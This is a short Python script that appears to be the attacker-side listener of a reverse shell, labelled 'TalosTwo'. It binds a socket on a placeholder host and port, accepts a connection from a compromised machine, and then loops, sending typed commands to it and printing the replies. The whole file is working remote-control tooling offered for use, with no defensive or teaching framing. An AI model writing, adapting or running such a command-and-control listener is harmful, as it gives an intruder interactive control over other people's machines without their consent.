import socket
import sys


HOST = 'IPORDOMAIN'
PORT = CONTROLPORT

# Create Socket
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Print bind shell info
print("Starting reverse bind shell on "+HOST+":"+str(PORT))
serversocket.bind((HOST, PORT))

# become a server socket
serversocket.listen(5)

# Wait For client
(clientsocket, address) = serversocket.accept()

print("Connection accepted from: ")
print(address)
while True:
    cmd = input("TalosTwo>")
    if len(cmd) > 0:
        clientsocket.send(cmd.encode())
    else:
        cmd = " "
        clientsocket.send(cmd.encode())
    data = clientsocket.recv(1024).decode()
    print(data)

clientsocket.close()
